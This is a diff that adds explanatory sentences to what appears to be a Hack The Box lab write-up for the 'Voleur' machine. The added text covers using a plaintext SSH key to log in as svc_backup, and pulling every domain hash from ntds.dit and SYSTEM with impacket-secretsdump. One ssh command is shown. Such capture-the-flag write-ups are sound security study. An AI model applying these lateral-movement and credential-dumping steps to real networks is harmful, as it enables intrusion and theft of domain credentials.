@@ -924,7 +924,7 @@ PS C:\Windows\system32>
 
 ## Lateral movement from jeremy to svc_backup
 
-Enumeration reveals 
+Enumeration reveals a note implying a linux system and an id_rsa key sitting in plaintext:
 
 ```
 PS C:\IT> cd 'Third-Line Support'
@@ -1005,6 +1005,8 @@ RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
 
 ```
 
+The key is used to access the backup system on linux:
+
 ```
 ssh -i id_rsa.key svc_backup@voleur.htb -p 2222
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -1057,6 +1059,8 @@ root
 ## Privilege Escalation
 
 ### Enumeration
+
+Navingating to the share reveals the ntds.dit and SYSTEM files, which can be used to read all the hashes from the domain with impacket-secretsdump
 
 ```
 root@DC:/mnt/c# cd IT
